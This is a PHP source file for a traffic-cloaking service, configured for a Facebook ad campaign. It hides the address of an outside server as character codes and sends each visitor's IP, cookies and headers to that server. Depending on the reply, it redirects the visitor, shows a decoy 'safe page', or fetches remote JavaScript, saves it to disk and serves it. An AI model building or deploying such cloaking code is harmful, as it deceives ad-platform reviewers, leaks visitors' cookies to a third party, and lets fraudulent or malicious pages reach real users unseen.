<?php
/**
 * Campaign: Facebook ZERO TEST
 * Created: 2019-10-18 09:10:13 UTC
 */

// ---------------------------------------------------
// Configuration

$campaignId = 'u3hxa4jbui0';

$campaignSignature = 'BVJsZMksxMM3q4Zk0EopLLz23TzhyMHIuk36qFiEXrZKHdH1fj';

// ---------------------------------------------------
// DO NOT EDIT

function httpHandleResponse( $response ) {
	$decodedResponse = json_decode( $response, true );

	if ( array_key_exists( 'error', $decodedResponse ) ) {
		header( $_SERVER['SERVER_PROTOCOL'] . " " . $decodedResponse['error'] . " " . $decodedResponse['message'] );
	} else {
		$currentURI = ( ! empty( $_SERVER['HTTPS'] ) ? 'https' : 'http' ) . '://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];

		if ( ! empty( $decodedResponse[0] ) && ( $decodedResponse[0] != $currentURI ) && ( $decodedResponse[1] == true ) && preg_match( "@^http@", $decodedResponse[0] ) ) {
			return $decodedResponse[0];
		}

		if ( ! empty( $decodedResponse[0] ) && ( $decodedResponse[0] != $currentURI ) && ( $decodedResponse[1] == true ) && ! preg_match( "@^http@", $decodedResponse[0] ) ) {
			$fileName = parse_url( $decodedResponse[0], PHP_URL_PATH );

			return ( $decodedResponse[0] != '[ZR]' ) ? $fileName : true;
		}

		if ( ! empty( $decodedResponse[0] ) && ( $decodedResponse[0] != $currentURI ) && ( $decodedResponse[1] == false ) && preg_match( "@^http@", $decodedResponse[0] ) ) {
			return $decodedResponse[0];
		}

		if ( ! empty( $decodedResponse[0] ) && ( $decodedResponse[0] != $currentURI ) && ( $decodedResponse[1] == false ) && ! preg_match( "@^http@", $decodedResponse[0] ) ) {
			$fileName = parse_url( $decodedResponse[0], PHP_URL_PATH );

			return ( $decodedResponse[0] != '[ZR]' ) ? $fileName : false;
		}

		if ( ! empty( $decodedResponse[0] ) && ( $decodedResponse[0] != $currentURI ) && ( $decodedResponse[1] == true ) ) {
			return true;
		}

		if ( ( $decodedResponse[1] == false ) && ( $decodedResponse[5] == true ) ) {
			header( "Location: " . $decodedResponse[0] );
			header( 'Content-Length: ' . rand( 1, 128 ) );
			exit;
		}

		return false;
	}

	return false;
}

function httpRequestMakePayload( $campaignId, $campaignSignature, array $postData, $useLPR = false ) {
	if ( ! array_key_exists( 'q', $postData ) ) {
		return $postData;
	}

	$postData = $postData['q'];

	$payload = preg_split( '@\|@', base64_decode( $postData ) );

	$payload[1] = $campaignSignature;

	$payload[28] = 'pisccl40';

	$payload[29] = (int) $useLPR;

	return base64_encode( implode( '|', $payload ) );
}

function httpRequestExec( $metadata ) {
	$headers = httpGetAllHeaders();

	$ch = httpRequestInitCall();

	curl_setopt( $ch, CURLOPT_HTTPHEADER, $headers );

	curl_setopt( $ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT'] );
	curl_setopt( $ch, CURLOPT_POST, true );
	curl_setopt( $ch, CURLOPT_POSTFIELDS, 'q=' . $metadata );

	curl_setopt( $ch, CURLOPT_TCP_NODELAY, 1 );
	curl_setopt( $ch, CURLOPT_RETURNTRANSFER, 1 );
	curl_setopt( $ch, CURLOPT_TIMEOUT, 5 );
	curl_setopt( $ch, CURLOPT_CONNECTTIMEOUT, 3 );
	curl_setopt( $ch, CURLOPT_DNS_CACHE_TIMEOUT, 120 );

	$http_response = curl_exec( $ch );

	$http_status = curl_getinfo( $ch );
	$http_code   = $http_status['http_code'];

	if ( $http_code != 200 ) {
		switch ( $http_code ) {
			case 400:
				$message = 'Bad Request';
				break;

			case 402:
				$message = 'Payment Required';
				break;

			case 417:
				$message = 'Expectation Failed';
				break;

			case 429:
				$message = 'Request Throttled';
				break;

			case 500:
				$message = 'Internal Server Error';
				break;

			default:
				$message = '';
				break;
		}
		$http_response = json_encode( [ 'error' => $http_code, 'message' => $message ] );
	}

	curl_close( $ch );

	return $http_response;
}

function httpGetHeaders() {
	$h = [
		'HTTP_REFERER'    => '',
		'HTTP_USER_AGENT' => '',
		'SERVER_NAME'     => '',
		'REQUEST_TIME'    => '',
		'QUERY_STRING'    => '',
	];

	while ( list( $key, $value ) = each( $h ) ) {
		$h[ $key ] = array_key_exists( $key, $_SERVER ) ? $_SERVER[ $key ] : $value;
	}

	return $h;
}

function httpGetAllHeaders() {
	$headersToFind = [
		'HTTP_X_REAL_IP',
		'HTTP_DEVICE_STOCK_UA',
		'REMOTE_ADDR',
		'HTTP_X_FORWARDED_FOR',
		'HTTP_X_OPERAMINI_PHONE_UA',
		'X_FB_HTTP_ENGINE',
		'HTTP_X_FB_HTTP_ENGINE',
		'REQUEST_SCHEME',
		'HEROKU_APP_DIR',
		'CONTEXT_DOCUMENT_ROOT',
		'X_PURPOSE',
		'HTTP_X_PURPOSE',
		'SCRIPT_FILENAME',
		'PHP_SELF',
		'SCRIPT_NAME',
		'HTTP_ACCEPT_ENCODING',
		'REQUEST_URI',
		'REQUEST_TIME_FLOAT',
		'QUERY_STRING',
		'HTTP_ACCEPT_LANGUAGE',
		'HTTP_CF_CONNECTING_IP',
		'HTTP_INCAP_CLIENT_IP',
		'PROFILE',
		'X_FORWARDED_FOR',
		'X_WAP_PROFILE',
		'HTTP_COOKIE',
		'WAP_PROFILE',
		'HTTP_REFERER',
		'HTTP_VIA',
		'HTTP_CLIENT_IP',
		'HTTP_X_REQUESTED_WITH',
		'HTTP_CONNECTION',
		'HTTP_USER_AGENT',
		'HTTP_HOST',
		'HTTP_ACCEPT',
		'HTTP_CF_CONNECTING_IP',
	];

	$headers = [];

	foreach ( $headersToFind as $header ) {
		if ( ! array_key_exists( $header, $_SERVER ) ) {
			continue;
		}
		$key       = 'X-LC-' . str_replace( '_', '-', $header );
		$value     = is_array( $_SERVER[ $header ] ) ? implode( ',', $_SERVER[ $header ] ) : $_SERVER[ $header ];
		$headers[] = $key . ':' . $value;
	}

	$headers[] = 'X-LC-SIG: BVJsZMksxMM3q4Zk0EopLLz23TzhyMHIuk36qFiEXrZKHdH1fj';

	return $headers;
}

function httpRequestInitCall() {
	$s = [ 104,116,116,112,115,58,47,47,108,99,106,115,99,100,110,46,99,111,109, 47, 114, 47 ];

	$u = '';
	foreach ( $s as $v ) {
		$u .= chr( $v );
	}
	$u .= 'u3hxa4jbui0';

	return curl_init( $u );
}

function httpGetIPHeaders( $returnList = false ) {
	if ( array_key_exists( 'HTTP_FORWARDED', $_SERVER ) ) {
		return str_replace( '@for\=@', '', $_SERVER['HTTP_FORWARDED'] );
	} else if ( array_key_exists( 'HTTP_X_FORWARDED_FOR', $_SERVER ) ) {
		$ipList = array_values( array_filter( explode( ',', $_SERVER['HTTP_X_FORWARDED_FOR'] ) ) );

		if ( sizeof( $ipList ) == 1 ) {
			return current( $ipList );
		}

		if ( $returnList ) {
			return $ipList;
		}

		foreach ( $ipList as $ip ) {
			$ip = trim( $ip );

			/**
			 * check if the value is anything other than an IP address
			 */
			if ( ! httpIsValidIP( $ip ) ) {
				continue;
			}
		}
	} else if ( array_key_exists( 'HTTP_CLIENT_IP', $_SERVER ) ) {
		return $_SERVER["HTTP_CLIENT_IP"];
	} else if ( array_key_exists( 'HTTP_CF_CONNECTING_IP', $_SERVER ) ) {
		return $_SERVER['HTTP_CF_CONNECTING_IP'];
	} else if ( array_key_exists( 'REMOTE_ADDR', $_SERVER ) ) {
		return $_SERVER["REMOTE_ADDR"];
	}

	return false;
}

function httpIsValidIP( $ipAddress ) {
	return (bool) filter_var( $ipAddress, FILTER_VALIDATE_IP );
}

function isPost() {
	return $_SERVER['REQUEST_METHOD'] == 'POST' ? true : false;
}

function getScriptURI( $jQueryVersion, $responseType ) {
	$s = [ 104,116,116,112,115,58,47,47,108,99,106,115,99,100,110,46,99,111,109,47,99,108,105,99,107,45,112,104,112,45,48,45,50,45,115,47];

	$u = '';
	foreach ( $s as $v ) {
		$u .= chr( $v );
	}
	$u .= "u3hxa4jbui0.js?v={$jQueryVersion}&rt={$responseType}";

	return $u;
}

function init( $pathToSafePage, $jQueryVersion = 1 ) {
	// Fetch JS
	$script = getURI( getScriptURI( $jQueryVersion, "html" ) );
	$file   = "u3hxa4jbui0.js";

	if (!file_exists($file)) {
		if (!touch($file)) {
			die("This script needs write permissions on the server.");
		}
	}

	if ($script === false) {
		if ($pathToSafePage === '/path/to/safe/page.html' || empty($pathToSafePage)) {
			die();
		}

		$uri = validateURI($pathToSafePage);
		print getURI($uri);
		die();
	}

	$fileHash = md5(file_get_contents($file));
	$scriptHash = md5($script);

	if ($fileHash !== $scriptHash) {
		if (!file_put_contents( $file, $script )) {
			if ($pathToSafePage === '/path/to/safe/page.html' || empty($pathToSafePage)) {
				die();
			}

			$uri = validateURI($pathToSafePage);
			print getURI($uri);
			die();
		}
	}

	print '<!DOCTYPE html><html><head><script type="text/javascript" src="'.$file.'?v=' . $jQueryVersion . '&rt=html"></script></head><body></body></html>';
	die();
}

function getURI( $uri ) {
	$ch = curl_init( $uri );

	curl_setopt( $ch, CURLOPT_RETURNTRANSFER, true );
	curl_setopt( $ch, CURLOPT_FOLLOWLOCATION, true );
	curl_setopt( $ch, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4 );
	curl_setopt( $ch, CURLOPT_USERAGENT, array_key_exists('HTTP_USER_AGENT', $_SERVER) ? $_SERVER['HTTP_USER_AGENT'] : '' );

	return curl_exec( $ch );
}

function validateURI( $uri ) {
	return filter_var( $uri, FILTER_VALIDATE_URL ) === false
		? buildURI( $uri )
		: $uri . '?' . $_SERVER['QUERY_STRING'];
}

function buildURI( $uri, $domain = DOMAIN ) {
	return buildSchema() . $domain . path( $uri );
}

function buildSchema() {
	return 'http' . ( empty( $_SERVER['HTTPS'] ) ? '' : 's' ) . '://';
}

function path( $uri ) {
	$parts = preg_split( "@\/@", $_SERVER['REQUEST_URI'] );

	$path = [];

	foreach ( $parts as $part ) {
		if ( empty( $part ) ) {
			continue;
		}

		if ( preg_match( '@\.\w+$@', $part ) ) {
			continue;
		}

		if ( is_int( strpos( $part, '?' ) ) ) {
			$part = $uri . substr( $part, strpos( $part, '?' ) );
		}

		array_push( $path, $part );
	}

	$path = implode( '/', $path );

	if ( ! preg_match( '@' . $uri . '@', $path ) ) {
		$path .= '/' . $uri;
	}

	return '/' . $path;
}

function isPHPVersionAcceptable() {
	if ( PHP_MAJOR_VERSION == 5 && PHP_MINOR_VERSION < 4 ) {
		return 'Please update your PHP Version to PHP 5.4 or higher to use this application.';
	}

	return true;
}

function isCURLInstalled() {
	if ( ! in_array( 'curl', get_loaded_extensions() ) ) {
		return 'This application requires that cURL be installed. Please install cURL to continue.';
	}

	return true;
}

function isJSONInstalled() {
	if ( ! function_exists( 'json_encode' ) ) {
		return 'This application requires that the PHP be able to decode JSON. Please enable a JSON for PHP.';
	}

	return true;
}

function isDirectoryWritable() {
	if ( ! is_readable( dirname( __FILE__ ) ) ) {
		return 'This application requires to be able to read to this directory for logging purposes. Please change permissions for this directory (' . ( dirname( __FILE__ ) ) . ') to continue.';
	}

	if ( ! is_writeable( dirname( __FILE__ ) ) ) {
		return 'This application requires to be able to write to this directory for logging purposes. Please change permissions for this directory (' . ( dirname( __FILE__ ) ) . ') to continue.';
	}

	return true;
}

function isResponseOutputSet() {
	if ( ! array_key_exists( 'outputFormat', $GLOBALS ) ) {
		return 'Your response output format has not been set. Please set your response output format to html or iframe to continue.';
	}

	if ( array_key_exists( 'outputFormat', $GLOBALS ) && ! in_array( $GLOBALS['outputFormat'], [
			'html',
			'iframe',
		] ) ) {
		return 'Your response output format has not been set. Please set your response output format to html or iframe to continue.';
	}

	return true;
}

function isApplicationReadyToRun() {
	print 'Checking application environment...' . nl2br( PHP_EOL );
	$checks    = [
		isPHPVersionAcceptable(),
		isCURLInstalled(),
		isJSONInstalled(),
		isDirectoryWritable(),
	];
	$hasErrors = false;

	foreach ( $checks as $check ) {
		if ( ! is_bool( $check ) ) {
			$hasErrors = true;

			print ' - ' . $check . nl2br( PHP_EOL );
		}
	}

	if ( empty( $hasErrors ) ) {
		print 'App ready to run!' . nl2br( PHP_EOL ) . 'Set `$enableDebugging` to `false` to continue.';
	}

	die();
}

function logToFile( $result ) {
	$date     = date( 'Y-m-d H:i:s.u' );
	$filename = 'leadcloak-log-u3hxa4jbui0.log';

	$contents = "[{$date}] Failed: {$result} " . PHP_EOL;

	if ( file_exists( $filename ) && ! is_writable( $filename ) ) {
		// ERROR
		return 'Error writing to log file';
	}

	return file_put_contents( $filename, $contents, FILE_APPEND ) ? true : false;
}

define( 'DOMAIN', $_SERVER['SERVER_NAME'] );

?>